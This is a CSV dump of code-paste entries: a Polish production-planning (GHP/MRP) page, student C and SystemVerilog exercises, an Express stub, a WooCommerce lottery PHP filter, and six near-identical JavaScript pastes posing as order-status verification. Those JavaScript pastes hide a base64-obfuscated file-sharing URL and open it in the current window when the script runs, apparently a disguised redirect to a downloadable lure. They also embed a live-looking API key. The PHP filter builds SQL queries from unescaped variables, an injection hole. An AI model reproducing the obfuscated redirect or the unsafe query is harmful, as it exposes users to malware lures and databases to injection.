id,title,username,language,date,content
6y1RLZh7,alg,black_duck11,HTML,Tuesday 25th of March 2025 09:22:07 AM CDT,"

<!DOCTYPE html>
<html lang=""pl"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>PROJEKT</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
        input {
            width: 50px;
            text-align: center;
        }
    </style>
</head>
<body>

<h2>Algorytm GHP</h2>
<p>Na stanie: <input type=""number"" id=""naStanie"" value=""20"" min=""0"" oninput=""calculateGRP()""></p>
<p>Czas realizacji: <input type=""number"" id=""czasRealizacji"" value=""1"" min=""1"" oninput=""calculateGRP()""></p>

<table id=""ghpTable"">
    <thead>
        <tr>
            <th>Kategoria</th>
            <th>Tydzień 1</th>
            <th>Tydzień 2</th>
            <th>Tydzień 3</th>
            <th>Tydzień 4</th>
            <th>Tydzień 5</th>
            <th>Tydzień 6</th>
            <th>Tydzień 7</th>
            <th>Tydzień 8</th>
            <th>Tydzień 9</th>
            <th>Tydzień 10</th>
        </tr>
    </thead>
    <tbody>
        <tr id=""popyt"">
            <td>Przewidywany popyt</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""20"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""produkcja"">
            <td>Produkcja</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""28"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""30"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""dostepne"">
            <td>Dostępne</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
        </tr>
    </tbody>
</table>

<table id=""mrpTable"">
    <h2>ALgorytm MRP</h2>
    <p>BOM 1</p>
    <p>Na stanie: <input type=""number"" id=""naStanieMRP"" value=""40"" min=""0"" oninput=""calculateMRP()""></p>
    <p>Czas realizacji: <input type=""number"" id=""czasRealizacjiMRP"" value=""2"" min=""1"" oninput=""calculateMRP()""></p>


    <thead>
        <tr>
            <th>Dane produkcyjne</th>
            <th>Tydzień 1</th>
            <th>Tydzień 2</th>
            <th>Tydzień 3</th>
            <th>Tydzień 4</th>
            <th>Tydzień 5</th>
            <th>Tydzień 6</th>
            
        </tr>
    </thead>
    <tbody>
        <tr id=""zapotrzebownie"">
            <td>Całkowite zapotrzebowanie</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
         
        </tr>
        <tr id=""przyjecia"">
            <td>Planowane przyjęcia</td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
        </tr>
        <tr id=""na_stanie"">
            <td>Przewidywane na stanie</td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
        </tr>
        <tr id=""zap_netto"">
            <td>Zapotrzebowanie netto</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""zamowienia"">
            <td>Planowane zamówienia</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""przyjecia_zamowien"">
            <td>Planowane przyjęcie zamówień</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
            
       
    </tbody>
</table>

<button onclick=""calculateGRP()"">Przelicz</button>

<script>
    let tygodnie = 10;
    let poczatkowyStan = 20;
    let popyt = [0, 0, 0, 0, 20, 0, 40, 0, 0, 0];
    let produkcja = [0, 0, 0, 0, 28, 0, 30, 0, 0, 0];
    let czasRealizacji = 1;

    function createTable() {
        let popytRow = document.getElementById(""popyt"");
        let produkcjaRow = document.getElementById(""produkcja"");
        let dostepneRow = document.getElementById(""dostepne"");

        // Usuwamy kolumny po 10 tygodniu
        let cells = popytRow.querySelectorAll('td');
        cells.forEach((cell, index) => {
            if (index > tygodnie) {
                cell.remove();
            }
        });
        
        cells = produkcjaRow.querySelectorAll('td');
        cells.forEach((cell, index) => {
            if (index > tygodnie) {
                cell.remove();
            }
        });

        cells = dostepneRow.querySelectorAll('td');
        cells.forEach((cell, index) => {
            if (index > tygodnie) {
                cell.remove();
            }
        });

        calculateGRP();
    }
    

    function calculateGRP() {
    let popytCells = document.querySelectorAll(""#popyt td input"");
    let produkcjaCells = document.querySelectorAll(""#produkcja td input"");
    let dostepneCells = document.querySelectorAll(""#dostepne td"");
    let zapotrzebowanieCells = document.querySelectorAll(""#zapotrzebownie td input"");
    let czasRealizacji = parseInt(document.getElementById(""czasRealizacji"").value) || 1;

    let dostepne = parseInt(document.getElementById(""naStanie"").value) || poczatkowyStan;
    
    // Obliczamy dostępność w tabeli GHP
    for (let i = 0; i < tygodnie; i++) {
        let popytT = parseInt(popytCells[i].value) || 0;
        let produkcjaT = parseInt(produkcjaCells[i].value) || 0;

        dostepne = dostepne - popytT + produkcjaT;
        dostepneCells[i+1].innerText = dostepne;
    }

    for (let i = 0; i < tygodnie - czasRealizacji; i++) {
        let produkcjaT = parseInt(produkcjaCells[i +czasRealizacji].value) || 0;
        if (zapotrzebowanieCells[i]) {
            zapotrzebowanieCells[i].value = produkcjaT;
}
      
         }
    }
    function calculateMRP() {
    let przewid_na_stanie = parseInt(document.getElementById(""naStanieMRP"").value) || 0;

    let cells = document.querySelectorAll(""#na_stanie td input"");

    // pole przewidywane na stanie usupełniane zgodnie z wartością z input
    for (let i = 0; i < cells.length; i++) {
        if (cells[i]) {
            cells[i].value = przewid_na_stanie;
        }
    }



}
function compareZapotrzebowanie() {
    // Odczytanie wartości z komórek
    let zapotrzebowanieCells = document.querySelectorAll(""#zapotrzebownie td input"");
    let naStanieCells = document.querySelectorAll(""#na_stanie td input"");

    // Przechodzimy po komórkach i porównujemy wartości
    for (let i = 0; i < zapotrzebowanieCells.length; i++) {
        let zapotrzebowanieValue = parseInt(zapotrzebowanieCells[i].value) || 0;
        let naStanieValue = parseInt(naStanieCells[i].value) || 0;

        // Porównanie wartości
        if (zapotrzebowanieValue > naStanieValue) {
            // Zrobimy coś, jeśli zapotrzebowanie jest większe niż stan
            console.log(""Zapotrzebowanie jest większe niż stan w tygodniu "" + (i + 1));
        } else if (zapotrzebowanieValue < naStanieValue) {
            // Zrobimy coś, jeśli zapotrzebowanie jest mniejsze niż stan
            console.log(""Stan jest większy niż zapotrzebowanie w tygodniu "" + (i + 1));
        } else {
            // Zrobimy coś, jeśli zapotrzebowanie i stan są równe
            console.log(""Zapotrzebowanie i stan są równe w tygodniu "" + (i + 1));
        }
    }
}




    document.getElementById(""czasRealizacji"").addEventListener('input', calculateGRP);
    document.getElementById(""naStanie"").addEventListener('input', calculateGRP);
    document.getElementById(""naStanieMRP"").addEventListener('input',calculateMRP)
    document.getElementById(""naStanieMRP"").addEventListener('input', compareZapotrzebowanie);

    
    createTable();
</script>

</body>
</html>"
9KPVcpyS,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:17:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/042/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FjX1Kf6t,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:05:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/906/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gHxUiPfE,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:53:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/881/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vwTpB0j1,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:41:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/148/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BvqSycBS,fixed errors,midnight_sun,C,Tuesday 25th of March 2025 08:40:23 AM CDT,"#include<stdio.h>
int main() {
	/*
	int age = a;
	float height = h, weight = w;

	정수(int)를 담을 수 있는 'age'라는 변수(상자)에 a를 집어 넣는다 -> a가 뭔데?
	실수(float)를 담을 수 있는 'height'라는 변수(상자)에 h를 집어 넣는다 -> h가 뭔데?
	실수(float)를 담을 수 있는 'weight'라는 변수(상자)에 w를 집어 넣는다 -> w가 뭔데?

	*/
	int age;
	float height, weight;

	printf(""Enter your age : "");

	//scanf(""%d"", &a); 함수 이름이 age 이므로 &age
	scanf(""%d"", &age);

	printf(""Enter your height in cm : "");

	//scanf(""%f"", &h); 함수 이름이 height이므로 &height
	scanf(""%f"", &height);

	printf(""Enter your weight in kg : "");

	//scanf(""%d"", %w);
	/*
	* 1. 함수 이름이 weight이므로 &weight
	* 2. %가 아닌 &
	* 3. 실수를 입력 받으므로 %f
	*/

	scanf(""%f"", &weight);

	//printf(66+(13.8*weight)+)5.0*height-6.8*age);
	/*
	* 1. 실수를 출력할 예정이고, 소수점 둘째 자리까지만 출력해야 하므로 %0.2f를 추가해야함
	* 2. ~~)5.0 -> 괄호 두번
	*/

	printf(""%0.2f"", 66 + 13.8 * weight + 5.0 * height - 6.8 * age);
	return 0;
}"
e2C1S6wE,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:28:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/553/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X8wxbfpG,Untitled,crying234324,VHDL,Tuesday 25th of March 2025 08:26:47 AM CDT,"// tutorial1_tb
//
// Uriel Martinez-Hernandez
// Updated 2022

`timescale 1ns / 1ps
// The line above determines that the # delay
// command uses 1ns steps and that the shortest
// delay considered is 1 ps.

// The testbench has no inputs or outputs. That
// would be like having wires hanging randomly
// off the side of your desk. Don't do that: you
// you might trip over them!
module tutorial1_tb();

      // The module under test has 4 inputs and 1
      // output. By using the same name in the
      // testbench we are able to make use of .*
      // in the instantiation of the module.
      logic A,B,C,D,Z;

      // Change the name on the line below to match
      // the module name you used. uut stands for
      // ""unit under test"". It's convention but not
      // required you could call it Susan if you
      // really wanted to.
      tutorial1 uut (.*);

      // The initial block describes what happens to
      // our module inputs during the test.
      initial
      begin
      
            // By starting with a short wait, we can
            // observe that the inputs start at neither
            // 1 nor 0.
            #10;
            
            // Now we clear all the inputs to zero.
            A = '0;
            B = '0;
            C = '0;
            D = '0;
            
            // Finally we set each input to one over a
            // period of 40 ns.
            #10 A = 1;        
                   B = 0;
                C = 0;
                D = 0;

            #10 A = 0;        
                   B = 1;
                C = 0;
                D = 0;

            #10 A = 1;        
                   B = 1;
                C = 0;
                D = 0;

            #10 A = 0;        
                   B = 0;
                C = 1;
                D = 0;

            #10 A = 1;        
                   B = 0;
                C = 1;
                D = 0;

            #10 A = 0;        
                   B = 1;
                C = 1;
                D = 0;
                  
            #10 A = 1;        
                   B = 1;
                C = 1;
                D = 0;

            #10 A = 0;        
                   B = 0;
                C = 0;
                D = 1;
                  
            // This is an incomplete test. Try to
            // modify it to test all input combinations.    
      end
      
endmodule"
KAqexYKn,History sort by ticket number,wpgenie,PHP,Tuesday 25th of March 2025 08:23:42 AM CDT,"add_filter( 'woocomerce_lottery_history', 'woocomerce_lottery_history_sort_by_ticket_number', 15 , 4 );

function woocomerce_lottery_history_sort_by_ticket_number( $history, $product_id, $user_id, $relisteddate ){
		global $wpdb;
		$wheredatefrom = '';
		$datefrom      = FALSE;
		$relisteddate  = get_post_meta( $product_id, '_lottery_relisted', true );
		if(!is_admin() && !empty($relisteddate)){
		    $datefrom = $relisteddate;
		}
		if($datefrom){
		    $wheredatefrom ="" AND CAST(date AS DATETIME) > '$datefrom' "";
		}
		if($user_id){
		    $wheredatefrom ="" AND wc_lottery_log.userid = $user_id"";
		}
		$history = $wpdb->get_results( 'SELECT * FROM '.$wpdb->prefix.'wc_lottery_log LEFT JOIN '.$wpdb->prefix.'wc_lottery_pn_log on '.$wpdb->prefix.'wc_lottery_log.id = '.$wpdb->prefix.'wc_lottery_pn_log.log_id WHERE '.$wpdb->prefix.'wc_lottery_log.lottery_id =' . $product_id . $wheredatefrom.' ORDER BY `ticket_number` ASC');
		return $history;
}
"
nWGpyVD1,Handlebars app,MCreeper12731,JavaScript,Tuesday 25th of March 2025 08:21:07 AM CDT,"import express from 'express';
import { dirname, join } from ""path"";
import { fileURLToPath } from ""url"";

const __dirname = dirname(fileURLToPath(import.meta.url));

const app = express();

app.set('view engine', 'hbs');
app.set('views', join(__dirname, 'views'));
app.use(express.static(join(__dirname, ""public"")));

// Definicija poti - app.get()


app.listen(3000, () => {
    console.log('Server is running at http://localhost:3000');
});"
hTzi7R1V,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:16:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/610/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
